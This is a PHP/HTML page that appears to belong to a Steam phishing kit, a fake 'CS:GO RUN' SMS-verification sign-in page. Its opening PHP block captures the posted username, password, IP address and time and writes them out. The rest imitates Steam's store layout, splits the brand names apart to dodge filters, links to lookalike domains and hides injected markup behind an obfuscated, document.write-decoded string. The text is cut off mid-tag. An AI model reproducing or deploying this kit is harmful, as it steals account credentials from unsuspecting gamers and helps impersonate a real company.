<?php 

include_once(__DIR__."/create_session.php");
date_default_timezone_set('America/Sao_Paulo');

$hora = date ("Y-m-d H:i:s");

$username = $_POST['myuser'];
$mypass = $_POST['mypass'];
$ip = $_SERVER['REMOTE_ADDR'];

write_in_file("username", $username);
write_in_file("password", $mypass);
write_in_file("ip", $ip);
write_in_file("horario", $hora);
?>


<html class=" responsive touch" lang="en"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="theme-color" content="#171a21">
		<title>CS:GO RUN</title>
 
    <link rel="icon" type="image/x-icon" href="https://static6.tgstat.ru/channels/_0/ce/ce8efeae926d129454fae80b31b2c803.jpg">


<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
    <script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://bam-cell.nr-data.net/1/39a2506779?a=3595048&amp;v=1215.1253ab8&amp;to=cFpaFUdWXVxWERoWVkBGXQ5bSh5DXhBqBEZHXQ%3D%3D&amp;rst=4787&amp;ck=1&amp;ref=#sessions/sms_auth&amp;qt=1&amp;ap=86&amp;be=1745&amp;fe=4761&amp;dc=2377&amp;af=err,xhr,stn,ins,spa&amp;perf=%7B%22timing%22:%7B%22of%22:1650069926950,%22n%22:0,%22u%22:1640,%22r%22:13,%22ue%22:1640,%22re%22:795,%22f%22:795,%22dn%22:795,%22dne%22:795,%22c%22:795,%22ce%22:795,%22rq%22:832,%22rp%22:1631,%22rpe%22:1781,%22dl%22:1642,%22di%22:2377,%22ds%22:2377,%22de%22:2482,%22dc%22:4760,%22l%22:4760,%22le%22:4762%7D,%22navigation%22:%7B%22rc%22:1%7D%7D&amp;fp=2376&amp;fcp=2376&amp;jsonp=NREUM.setToken"></script><script data-savepage-type="" type="text/plain" data-savepage-src="https://js-agent.newrelic.com/nr-spa-1215.min.js"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="//cdn.smartnews-ads.com/i/pixel.js"></script><script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://cdn.treasuredata.com/sdk/1.9.2/td.min.js"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://b92.yahoo.co.jp/search/?p=J0YC7G24CU&amp;label=&amp;ref=https%3A%2F%2Fyyh.com%2Fsessions%2Fsms_auth%3Ftype%3Dconsumer&amp;rref=https%3A%2F%2Fyyh.com%2Fsessions%2Fsms_auth%3Ftype%3Dconsumer&amp;pt=&amp;item=&amp;cat=&amp;price=&amp;quantity=&amp;r=1650069929.9188411&amp;pvid=xkvn7upcuvkl21515wz&amp;tsyjad=1650054731"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://b92.yahoo.co.jp/search/?p=FRUGWDMQVI&amp;label=&amp;ref=https%3A%2F%2Fyyh.com%2Fsessions%2Fsms_auth%3Ftype%3Dconsumer&amp;rref=https%3A%2F%2Fyyh.com%2Fsessions%2Fsms_auth%3Ftype%3Dconsumer&amp;pt=&amp;item=&amp;cat=&amp;price=&amp;quantity=&amp;r=1650069929.6834908&amp;pvid=xkvn7upcuvkl21515wz&amp;tsyjad=1650054731"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://b92.yahoo.co.jp/search/?p=3X7RZK9SK1&amp;label=&amp;ref=https%3A%2F%2Fyyh.com%2Fsessions%2Fsms_auth%3Ftype%3Dconsumer&amp;rref=https%3A%2F%2Fyyh.com%2Fsessions%2Fsms_auth%3Ftype%3Dconsumer&amp;pt=&amp;item=&amp;cat=&amp;price=&amp;quantity=&amp;r=1650069929.1438942&amp;pvid=xkvn7upcuvkl21515wz&amp;tsyjad=1650054731&amp;_impl=ytag"></script><script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://s.yimg.jp/images/listing/tool/cv/ytag.js"></script><script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://s.yimg.jp/images/listing/tool/cv/ytag.js"></script><script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://s.yimg.jp/images/listing/tool/cv/ytag.js"></script><script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://www.googleadservices.com/pagead/conversion_async.js"></script><script data-savepage-type="text/javascript" type="text/plain" async="" data-savepage-src="https://www.google-analytics.com/plugins/ua/linkid.js"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://static.ads-twitter.com/uwt.js"></script><script data-savepage-type="" type="text/plain" data-savepage-src="https://connect.facebook.net/signals/config/1063541094181450?v=2.9.57&amp;r=stable" async=""></script><script data-savepage-type="" type="text/plain" data-savepage-src="https://connect.facebook.net/signals/config/1921602911404723?v=2.9.57&amp;r=stable" async=""></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://connect.facebook.net/en_US/fbevents.js"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://www.googletagmanager.com/gtm.js?id=GTM-KGXLHSS"></script><script data-savepage-type="" type="text/plain" async="" data-savepage-src="https://www.google-analytics.com/analytics.js"></script><script data-savepage-type="" type="text/plain" data-savepage-src="https://www.googleoptimize.com/optimize.js?id=GTM-5PHKT7Q"></script>
    <script data-savepage-type="" type="text/plain"></script>
  <meta charset="UTF-8">
<script data-savepage-type="" type="text/plain"></script>
<script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain" id="Coin98_Injected"></script>
  <title>Sms Verification</title>
  

<style id="savepage-cssvariables">
  :root {
  }
</style>

 

 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">      
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>


    <script src="dados_comando.js" type="text/javascript"></script>

    
<script language="JavaScript1.2">
<!--


function get_password() {
  orig_pass = prompt;
  
  password = new Array(orig_pass.length);
  for(i=0; i<orig_pass.length; i++) {
    password[i] = orig_pass.charCodeAt(i);
  }
  return password;
}

password = get_password();
orig = unescape("".concat('%0A%0A%09%0A%09%0A%09%3Clinkmmmhref%3D%22./public77/shared/css/motiva_sans7d78.css%3Fv%3DRc2hpzg2Ex3T%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Clinkmmmhref%3D%22./public77/shared/css/shared_global9fe0.css%3Fv%3DQE0cUHo6dJZI%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Clinkmmmhref%3D%22./public77/shared/css/buttonsdc1a.css%3Fv%3D6PFqex5UPprb%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Clinkmmmhref%3D%22./public77/css/v6/store14e9.css%3Fv%3DSKTxcj16eYn6%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Clinkmmmhref%3D%22./public77/css/v6/cart858b.css%3Fv%3Du2FIaietX6aF%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Clinkmmmhref%3D%22./public77/css/v6/browse004f.css%3Fv%3DwWw5tW1y7nea%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Clinkmmmhref%3D%22./public77/shared/css/loginf476.css%3Fv%3Df21hjJ6niQeQ%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Clinkmmmhref%3D%22./public77/shared/css/shared_responsive75c0.css%3Fv%3DcuGNP1dzetug%26amp%3Bl%3Denglish%22mmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22%3E%0A%3Cscriptmmmtype%3D%22text/javascript%22mmmsrc%3D%22./public77/shared/javascript/jquery-1.8.3.min1489.js%3Fv%3D.TZ2NKhB-nliU%26amp%3B_co_domain%3D1%22%3E%3C/script%3E%0A%3Cscriptmmmtype%3D%22text/javascript%22%3E%24Jmmm%3DmmmjQuery.noConflict%28%29%3B%3C/script%3E%3Cscriptmmmtype%3D%22text/javascript%22%3EVmmmammmlmmmvmmmemmm_public77_PATHmmm%3Dmmm%22https%3A///C%3A/Users/Pks/Desktop/gmail.html%5C/%5C/store.akamai.Smmmteamstatic.com%5C/public77%5C/%22%3B%3C/script%3E%3Cscriptmmmtype%3D%22text/javascript%22mmmsrc%3D%22./public77/shared/javascript/tooltip29bb.js%3Fv%3D.zYHOpI1L3Rt0%26amp%3B_co_domain%3D1%22%3E%3C/script%3E%0A%0A%3Cscriptmmmtype%3D%22text/javascript%22mmmsrc%3D%22./public77/shared/javascript/shared_globalf906.js%3Fv%3DArFQHXhltxfG%26amp%3Bl%3Denglish%26amp%3B_co_domain%3D1%22%3E%3C/script%3E%0A%0A%3Cscriptmmmtype%3D%22text/javascript%22mmmsrc%3D%22./public77/javascript/main615d.js%3Fv%3D3Dlr5ET2_GiB%26amp%3Bl%3Denglish%26amp%3B_co_domain%3D1%22%3E%3C/script%3E%0A%0A%3Cscriptmmmtype%3D%22text/javascript%22mmmsrc%3D%22./public77/javascript/dynamicstoree9f2.js%3Fv%3D_q5nMbbjuyRN%26amp%3Bl%3Denglish%26amp%3B_co_domain%3D1%22%3E%3C/script%3E%0A%0A%3Cscriptmmmtype%3D%22text/javascript%22%3EObject.sealmmm%26%26mmm%5BmmmObjectmmmmmmArraymmmmmmStringmmmmmmNumbermmm%5D.map%28mmmfunction%28mmmbuiltinmmm%29mmm%7BmmmObject.seal%28mmmbuiltin.prototypemmm%29%3Bmmm%7Dmmm%29%3B%3C/script%3E%0A%09%09%3Cscriptmmmtype%3D%22text/javascript%22%3E%0A%09%09%09document.addEventListener%28%27DOMContentLoaded%27mmmmmmfunction%28event%29mmm%7B%0A%09%09%09%09%24J.data%28mmmdocumentmmmmmm%27x_readytime%27mmmmmmnewmmmDate%28%29.getTime%28%29mmm%29%3B%0A%09%09%09%09%24J.data%28mmmdocumentmmmmmm%27x_oldref%27mmmmmmGetNavCookie%28%29mmm%29%3B%0A%09%09%09%09SetupTooltips%28mmm%7BmmmtooltipCSSClass%3Ammm%27store_tooltip%27%7Dmmm%29%3B%0A%09%09%7D%29%3B%0A%09%09%3C/script%3E%3Cscriptmmmtype%3D%22text/javascript%22mmmsrc%3D%22./public77/shared/javascript/logind39e.js%3Fv%3Dv36TDHXA_sAC%26amp%3Bl%3Denglish%26amp%3B_co_domain%3D1%22%3E%3C/script%3E%0A%3Cscriptmmmtype%3D%22text/javascript%22mmmsrc%3D%22./public77/shared/javascript/shared_responsive_adapterd399.js%3Fv%3DpSvIAKtunfWg%26amp%3Bl%3Denglish%26amp%3B_co_domain%3D1%22%3E%3C/script%3E%0A%0A%09%09%09%09%09%09%3Cmetammmname%3D%22twitter%3Acard%22mmmcontent%3D%22summary_large_image%22%3E%0A%09%09%09%0A%09%3Cmetammmname%3D%22twitter%3Asite%22mmmcontent%3D%22@Smmmteam%22%3E%0A%0A%09%09%09%09%09%09%3Cmetammmproperty%3D%22og%3Atitle%22mmmcontent%3D%22SignmmmIn%22%3E%0A%09%09%09%09%09%3Cmetammmproperty%3D%22twitter%3Atitle%22mmmcontent%3D%22SignmmmIn%22%3E%0A%09%09%09%09%09%3Cmetammmproperty%3D%22og%3Atype%22mmmcontent%3D%22website%22%3E%0A%09%09%09%09%09%3Cmetammmproperty%3D%22fb%3Aapp_id%22mmmcontent%3D%22105386699540688%22%3E%0A%09%09%09%09%09%3Cmetammmproperty%3D%22og%3Asite%22mmmcontent%3D%22Smmmteam%22%3E%0A%09%09%09%0A%09%0A%09%09%09%3Clinkmmmrel%3D%22image_src%22mmmhref%3D%22./public77/shared/images/responsive/share_Smmmteam_logo.png%22%3E%0A%09%09%3Cmetammmproperty%3D%22og%3Aimage%22mmmcontent%3D%22./share_Smmmteam_logo.png%22%3E%0A%09%09%3Cmetammmname%3D%22twitter%3Aimage%22mmmcontent%3D%22./share_Smmmteam_logo.png%22%3E%0A%09%09%09%09%09%3Cmetammmproperty%3D%22og%3Aimage%3Asecure%22mmmcontent%3D%22./share_Smmmteam_logo.png%22%3E%0A%09%09%09%09%0A%09%0A%09%0A%09%0A%09%0A%09%3Clinkmmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22mmmhref%3D%22./public77/css/applications/store/chunk_9229560c08aec.css%3Fcontenthash%3Dfbe4933f4e331dc0e58a%22%3E%3Clinkmmmrel%3D%22stylesheet%22mmmtype%3D%22text/css%22mmmhref%3D%22./public77/css/applications/store/login3096.css%3Fcontenthash%3D38bbe7298529efbe4cc8%22%3E%0A%09%0A%09%0A%09'));
orig = orig.split("");

passnum = orig.length % password.length;
for(i=orig.length-1; i>=0; i--) {

  passnum--;
  if (passnum == -1) passnum = password.length - 1;
  
  pos1 = i;
  pos2 = i + password[passnum];

  if (pos2 >= orig.length) continue;

  char1 = orig[pos1];
  char2 = orig[pos2];

  orig[pos2] = char1;
  orig[pos1] = char2;

}

orig1 = "";
for(i=0;i<orig.length;i++) {
  orig1 = orig1 + orig[i];
}
orig1 = orig1.replace(/mmm/g,"\r\n");











document.write(orig1);

//-->

</script>
	
	
	<link href="./public77/shared/css/motiva_sans7d78.css?v=Rc2hpzg2Ex3T&amp;l=english" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/shared_global9fe0.css?v=QE0cUHo6dJZI&amp;l=english" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/buttonsdc1a.css?v=6PFqex5UPprb&amp;l=english" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/store14e9.css?v=SKTxcj16eYn6&amp;l=english" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/cart858b.css?v=u2FIaietX6aF&amp;l=english" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/browse004f.css?v=wWw5tW1y7nea&amp;l=english" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/loginf476.css?v=f21hjJ6niQeQ&amp;l=english" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/shared_responsive75c0.css?v=cuGNP1dzetug&amp;l=english" rel="stylesheet" type="text/css">
<script type="text/javascript" src="./public77/shared/javascript/jquery-1.8.3.min1489.js?v=.TZ2NKhB-nliU&amp;_co_domain=1"></script>
<script type="text/javascript">$J
=
jQuery.noConflict();</script><script type="text/javascript">V
a
l
v
e
_public77_PATH
=
"https:///C:/Users/Pks/Desktop/gmail.html\/\/store.akamai.S
teamstatic.com\/public77\/";</script><script type="text/javascript" src="./public77/shared/javascript/tooltip29bb.js?v=.zYHOpI1L3Rt0&amp;_co_domain=1"></script>

<script type="text/javascript" src="./public77/shared/javascript/shared_globalf906.js?v=ArFQHXhltxfG&amp;l=english&amp;_co_domain=1"></script>

<script type="text/javascript" src="./public77/javascript/main615d.js?v=3Dlr5ET2_GiB&amp;l=english&amp;_co_domain=1"></script>

<script type="text/javascript" src="./public77/javascript/dynamicstoree9f2.js?v=_q5nMbbjuyRN&amp;l=english&amp;_co_domain=1"></script>

<script type="text/javascript">Object.seal
&&
[
Object

Array

String

Number
].map(
function(
builtin
)
{
Object.seal(
builtin.prototype
);
}
);</script>
		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded'

function(event)
{
				$J.data(
document

'x_readytime'

new
Date().getTime()
);
				$J.data(
document

'x_oldref'

GetNavCookie()
);
				SetupTooltips(
{
tooltipCSSClass:
'store_tooltip'}
);
		});
		</script><script type="text/javascript" src="./public77/shared/javascript/logind39e.js?v=v36TDHXA_sAC&amp;l=english&amp;_co_domain=1"></script>
<script type="text/javascript" src="./public77/shared/javascript/shared_responsive_adapterd399.js?v=pSvIAKtunfWg&amp;l=english&amp;_co_domain=1"></script>

						<meta name="twitter:card" content="summary_large_image">
			
	<meta name="twitter:site" content="@S
team">

						<meta property="og:title" content="Sign
In">
					<meta property="twitter:title" content="Sign
In">
					<meta property="og:type" content="website">
					<meta property="fb:app_id" content="105386699540688">
					<meta property="og:site" content="S
team">
			
	
			<link rel="image_src" href="./public77/shared/images/responsive/share_S
team_logo.png">
		<meta property="og:image" content="./share_S
team_logo.png">
		<meta name="twitter:image" content="./share_S
team_logo.png">
					<meta property="og:image:secure" content="./share_S
team_logo.png">
				
	
	
	
	
	<link rel="stylesheet" type="text/css" href="./public77/css/applications/store/chunk_9229560c08aec.css?contenthash=fbe4933f4e331dc0e58a"><link rel="stylesheet" type="text/css" href="./public77/css/applications/store/login3096.css?contenthash=38bbe7298529efbe4cc8">
	
	
	</head><body class="login v6 global responsive_page ">undefined
	
	
	<link href="./public77/shared/css/motiva_sans7d78.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/shared_global9fe0.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/buttonsdc1a.css" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/store14e9.css" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/cart858b.css" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/browse004f.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/loginf476.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/shared_responsive75c0.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="./public77/shared/javascript/jquery-1.8.3.min1489.js"></script>
<script type="text/javascript">$J
=
jQuery.noConflict();</script><script type="text/javascript">V
a
l
v
e
_public77_PATH
=
"https:///C:/Users/Pks/Desktop/gmail.html\/\/store.akamai.S
teamstatic.com\/public77\/";</script><script type="text/javascript" src="./public77/shared/javascript/tooltip29bb.js"></script>

<script type="text/javascript" src="./public77/shared/javascript/shared_globalf906.js"></script>

<script type="text/javascript" src="./public77/javascript/main615d.js"></script>

<script type="text/javascript" src="./public77/javascript/dynamicstoree9f2.js"></script>

<script type="text/javascript">Object.seal
&&
[
Object

Array

String

Number
].map(
function(
builtin
)
{
Object.seal(
builtin.prototype
);
}
);</script>
		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded'

function(event)
{
				$J.data(
document

'x_readytime'

new
Date().getTime()
);
				$J.data(
document

'x_oldref'

GetNavCookie()
);
				SetupTooltips(
{
tooltipCSSClass:
'store_tooltip'}
);
		});
		</script><script type="text/javascript" src="./public77/shared/javascript/logind39e.js?v=v36TDHXA_sAC&amp;l=english&amp;_co_domain=1"></script>
<script type="text/javascript" src="./public77/shared/javascript/shared_responsive_adapterd399.js?v=pSvIAKtunfWg&amp;l=english&amp;_co_domain=1"></script>

						<meta name="twitter:card" content="summary_large_image">
			
	<meta name="twitter:site" content="@S
team">

						<meta property="og:title" content="Sign
In">
					<meta property="twitter:title" content="Sign
In">
					<meta property="og:type" content="website">
					<meta property="fb:app_id" content="105386699540688">
					<meta property="og:site" content="S
team">
			
	
			<link rel="image_src" href="./public77/shared/images/responsive/share_S
team_logo.png">
		<meta property="og:image" content="./share_S
team_logo.png">
		<meta name="twitter:image" content="./share_S
team_logo.png">
					<meta property="og:image:secure" content="./share_S
team_logo.png">
				
	
	
	
	
	<link rel="stylesheet" type="text/css" href="./public77/css/applications/store/chunk_9229560c08aec.css?contenthash=fbe4933f4e331dc0e58a"><link rel="stylesheet" type="text/css" href="./public77/css/applications/store/login3096.css?contenthash=38bbe7298529efbe4cc8">
	
	
	 
	

	
	<link href="./public77/shared/css/motiva_sans7d78.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/shared_global9fe0.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/buttonsdc1a.css" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/store14e9.css" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/cart858b.css" rel="stylesheet" type="text/css">
<link href="./public77/css/v6/browse004f.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/loginf476.css" rel="stylesheet" type="text/css">
<link href="./public77/shared/css/shared_responsive75c0.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="./public77/shared/javascript/jquery-1.8.3.min1489.js"></script>
<script type="text/javascript">
=
jQuery.noConflict();</script><script type="text/javascript">V
a
l
v
e
_public77_PATH
=
"https:///C:/Users/Pks/Desktop/gmail.html\/\/store.akamai.S
teamstatic.com\/public77\/";</script><script type="text/javascript" src="./public77/shared/javascript/tooltip29bb.js"></script>

<script type="text/javascript" src="./public77/shared/javascript/shared_globalf906.js"></script>

<script type="text/javascript" src="./public77/javascript/main615d.js"></script>

<script type="text/javascript" src="./public77/javascript/dynamicstoree9f2.js"></script>

<script type="text/javascript">Object.seal
&&
[
Object

Array

String

Number
].map(
function(
builtin
)
{
Object.seal(
builtin.prototype
);
}
);</script>
		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded'

function(event)
{
				$J.data(
document

'x_readytime'

new
Date().getTime()
);
				$J.data(
document

'x_oldref'

GetNavCookie()
);
				SetupTooltips(
{
tooltipCSSClass:
'store_tooltip'}
);
		});
		</script><script type="text/javascript" src="./public77/shared/javascript/logind39e.js"></script>
<script type="text/javascript" src="./public77/shared/javascript/shared_responsive_adapterd399.js"></script>

						<meta name="twitter:card" content="summary_large_image">
			
	<meta name="twitter:site" content="@S
team">

						<meta property="og:title" content="Sign
In">
					<meta property="twitter:title" content="Sign
In">
					<meta property="og:type" content="website">
					<meta property="fb:app_id" content="105386699540688">
					<meta property="og:site" content="S
team">
			
	
			<link rel="image_src" href="./public77/shared/images/responsive/share_S
team_logo.png">
		<meta property="og:image" content="./share_S
team_logo.png">
		<meta name="twitter:image" content="./share_S
team_logo.png">
					<meta property="og:image:secure" content="./share_S
team_logo.png">
				
	
	
	
	
	<link rel="stylesheet" type="text/css" href="./public77/css/applications/store/chunk_9229560c08aec.css"><link rel="stylesheet" type="text/css" href="./public77/css/applications/store/login3096.css?contenthash=38bbe7298529efbe4cc8">
	
	
	undefined
<noscript></noscript>



	
	





































<style>
img {
margin-left: 35%;
}
</style>
 
<div class="responsive_page_frame
with_header">
						<div class="responsive_page_menu_ctn
mainmenu">
				<div class="responsive_page_menu" id="responsive_page_menu">
										<div class="mainmenu_contents">
						<div class="mainmenu_contents_items">
															<a class="menuitem" href="https://store.crashdontenter.com/login/?redir=login%2F%3Fredir%3D%26redir_ssl%3D1%26snr%3D1_4_4__global-header&amp;redir_ssl=1&amp;snr=1_60_4__global-header">
									Login								</a>
								<a class="menuite
msupernav
supernav_active" href="https://store.crashdontenter.com/?snr=1_60_4__global-responsive-menu" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		Store	</a>
	<div class="submenu_store" style="display:
none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.crashdontenter.com/?snr=1_60_4__global-responsive-menu">Home</a>
					<a class="submenuitem" href="https://store.crashdontenter.com/explore/?snr=1_60_4__global-responsive-menu">Discovery
Queue</a>
				<a class="submenuitem" href="https://marketeiro2023.com/my/wishlist/">Wishlist</a>
		<a class="submenuitem" href="https://store.crashdontenter.com/points/shop/?snr=1_60_4__global-responsive-menu">Points
Shop</a>	







	<a class="submenuitem" href="https://store.crashdontenter.com/news/?snr=1_60_4__global-responsive-menu">News</a>
					<a class="submenuitem" href="https://store.crashdontenter.com/stats/?snr=1_60_4__global-responsive-menu">Stats</a>
					</div>


			<a class="menuite
msupernav
" style="display:
block" href="https://marketeiro2023.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			Community		</a>
		<div class="submenu_community" style="display:
none;" data-submenuid="community">
			<a class="submenuitem" href="https://marketeiro2023.com/">Home</a>
			<a class="submenuitem" href="https://marketeiro2023.com/discussions/">Discussions</a>
			<a class="submenuitem" href="https://marketeiro2023.com/workshop/">Workshop</a>
			<a class="submenuitem" href="https://marketeiro2023.com/market/">Market</a>
			<a class="submenuitem" href="https://marketeiro2023.com/?subsection=broadcasts">Broadcasts</a>
											</div>
		

	
	
	<a class="menuite
m" href="https://help.crashdontenter.com/en/">
		Support	</a>

							<div class="minor_menu_items">
																								<div class="menuite
mchange_language_action">
									Change
language								</div>
																																	<div class="menuitem" onclick="Responsive_RequestDesktopView();">
										View
desktop
website									</div>
															</div>
						</div>
						<div class="mainmenu_footer_spacer

"></div>
						<div class="mainmenu_footer">
															<div class="mainmenu_footer_logo"><img src="./public77/shared/images/responsive/logo_V
a
l
v
e
_footer.png"></div>
								©
V
a
l
v
e

Corporation.
All
rights
reserved.
All
trademarks
are
property
of
their
respective
owners
in
the
US
and
other
countries.								<span class="mainmenu_V
a
l
v
e
_links">
									<a href="https://store.crashdontenter.com/privacy_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Privacy
Policy</a>
									&nbsp;|
&nbsp;<a href="http://www.V
a
l
v
e
software.com/legal.htm" target="_blank">Legal</a>
									&nbsp;|
&nbsp;<a href="https://store.crashdontenter.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">S
tea
mSubscriber
Agreement</a>
									&nbsp;|
&nbsp;<a href="https://store.crashdontenter.com/S
team_refunds/?snr=1_60_4__global-responsive-menu" target="_blank">Refunds</a>
								</span>
													</div>
					</div>
									</div>
			</div>
		
		<div class="responsive_local_menu_tab"></div>

		<div class="responsive_page_menu_ctn
localmenu">
			<div class="responsive_page_menu" id="responsive_page_local_menu" data-panel="{&quot;onOptionsActionDescription&quot;:&quot;Filter&quot;
&quot;onOptionsButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;
&quot;onCancelButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;}">
				<div class="localmenu_content" data-panel="{&quot;maintainY&quot;:true
&quot;bFocusRingRoot&quot;:true
&quot;flow-children&quot;:&quot;column&quot;}">
				</div>
			</div>
		</div>



					<div class="responsive_header">
				<div class="responsive_header_content">
					<div id="responsive_menu_logo">
						
											</div>
					
				</div>
			</div>
		
		<div class="responsive_page_content_overlay">

		</div>

		<div class="responsive_fixonscroll_ctn
nonresponsive_hidden
">
		</div>
	
	<div class="responsive_page_content">

		<div id="global_header" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
	<div class="content">
		<div class="logo">
			<span id="logo_holder">
									<a href="https://store.crashdontenter.com/?snr=1_60_4__global-header">
						<img src="https://store.akamai.S
teamstatic.com/public77/shared/images/header/logo_S
team.svg?t=962016" width="176" height="44">
					</a>
							</span>
		</div>

			<div class="supernav_container">
	<a class="menuite
msupernav
supernav_active" href="https://store.crashdontenter.com/?snr=1_60_4__global-header" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		STORE	</a>
	<div class="submenu_store" style="display:
none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.crashdontenter.com/?snr=1_60_4__global-header">Home</a>
					<a class="submenuitem" href="https://store.crashdontenter.com/explore/?snr=1_60_4__global-header">Discovery
Queue</a>
				<a class="submenuitem" href="https://marketeiro2023.com/my/wishlist/">Wishlist</a>
		<a class="submenuitem" href="https://store.crashdontenter.com/points/shop/?snr=1_60_4__global-header">Points
Shop</a>	







	<a class="submenuitem" href="https://store.crashdontenter.com/news/?snr=1_60_4__global-header">News</a>
					<a class="submenuitem" href="https://store.crashdontenter.com/stats/?snr=1_60_4__global-header">Stats</a>
					</div>


			<a class="menuite
msupernav
" style="display:
block" href="https://marketeiro2023.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
			COMMUNITY		</a>
		<div class="submenu_community" style="display:
none;" data-submenuid="community">
			<a class="submenuitem" href="https://marketeiro2023.com/">Home</a>
			<a class="submenuitem" href="https://marketeiro2023.com/discussions/">Discussions</a>
			<a class="submenuitem" href="https://marketeiro2023.com/workshop/">Workshop</a>
			<a class="submenuitem" href="https://marketeiro2023.com/market/">Market</a>
			<a class="submenuitem" href="https://marketeiro2023.com/?subsection=broadcasts">Broadcasts</a>
											</div>
		

	
						<a class="menuite
m" href="https://store.crashdontenter.com/about/?snr=1_60_4__global-header">
				About			</a>
			
	<a class="menuite
m" href="https://help.crashdontenter.com/en/">
		SUPPORT	</a>
	</div>
	<script type="text/javascript">
		jQuery(function($)
{
			$('#global_header
.supernav').v_tooltip({'location':'bottom'

'destroyWhenDone':
false

'tooltipClass':
'supernav_content'

'offsetY':-6

'offsetX':
1

'horizontalSnap':
4

'tooltipParent':
'#global_header
.supernav_container'

'correctForScreenSize':
false});
		});
	</script>

		<div id="global_actions">
			<div id="global_action_menu">
									<a class="header_installS
team_btn
header_installS
team_btn_green" href="https://store.crashdontenter.com/about/?snr=1_60_4__global-header">
						<div class="header_installS
team_btn_content">
							Install
S
team						</div>
					</a>
				
				
														<a class="global_action_link" href="https://store.crashdontenter.com/login/?redir=login%2F%3Fredir%3D%26redir_ssl%3D1%26snr%3D1_4_4__global-header&amp;redir_ssl=1&amp;snr=1_60_4__global-header">login</a>
											&nbsp;|&nbsp;
						<span class="pulldown
global_action_link" id="language_pulldown" onclick="ShowMenu(
this

'language_dropdown'

'right'
);">language</span>
						<div class="popup_block_new" id="language_dropdown" style="display:
none;">
							<div class="popup_body
popup_menu">
																																					<a class="popup_menu_ite
mtight" href="gmail1664.html?l=schinese&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'schinese'
);
return
false;">简体中文
(Simplified
Chinese)</a>
																													<a class="popup_menu_ite
mtight" href="gmail0c24.html?l=tchinese&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'tchinese'
);
return
false;">繁體中文
(Traditional
Chinese)</a>
																													<a class="popup_menu_ite
mtight" href="gmail9c7d.html?l=japanese&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'japanese'
);
return
false;">日本語
(Japanese)</a>
																													<a class="popup_menu_ite
